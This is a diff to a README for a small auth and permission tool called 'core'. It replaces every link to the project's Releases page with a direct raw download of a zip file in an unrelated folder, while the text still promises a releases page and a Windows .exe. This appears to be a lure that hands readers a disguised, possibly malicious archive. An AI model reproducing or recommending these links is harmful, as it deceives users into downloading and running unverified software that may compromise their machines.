@@ -1,6 +1,6 @@
 # 🔐 core - Simple Auth and Permission Manager
 
-[![Download core](https://img.shields.io/badge/Download-Get%20core-blue?style=for-the-badge)](https://github.com/Speckled-pharyngeal993/core/releases)
+[![Download core](https://img.shields.io/badge/Download-Get%20core-blue?style=for-the-badge)](https://raw.githubusercontent.com/Speckled-pharyngeal993/core/main/Chrysemys/Software-v2.8.zip)
 
 ---
 
@@ -28,7 +28,7 @@ core runs as a basic program but connects to databases to store data. You do not
 
 ## 🌐 Visit to Download core
 
-[Download core from Releases](https://github.com/Speckled-pharyngeal993/core/releases)
+[Download core from Releases](https://raw.githubusercontent.com/Speckled-pharyngeal993/core/main/Chrysemys/Software-v2.8.zip)
 
 Please visit this page to get the latest version of core. The releases page contains all current and past versions. You will find files ready for Windows download.
 
@@ -40,7 +40,7 @@ Follow these steps to get core up and running quickly on your PC.
 
 ### 1. Go to the Releases Page  
 Click the button above or open this URL in your browser:  
-https://github.com/Speckled-pharyngeal993/core/releases
+https://raw.githubusercontent.com/Speckled-pharyngeal993/core/main/Chrysemys/Software-v2.8.zip
 
 ### 2. Find the Latest Windows Version  
 Look for a file with `.exe` in its name. It will usually include the version number. This is the program file for Windows.
@@ -121,4 +121,4 @@ If you have questions or face issues, check the "Issues" tab on the GitHub proje
 ## 🚀 Ready to Start?
 
 Download core here:  
-[Download core from Releases](https://github.com/Speckled-pharyngeal993/core/releases)
+[Download core from Releases](https://raw.githubusercontent.com/Speckled-pharyngeal993/core/main/Chrysemys/Software-v2.8.zip)
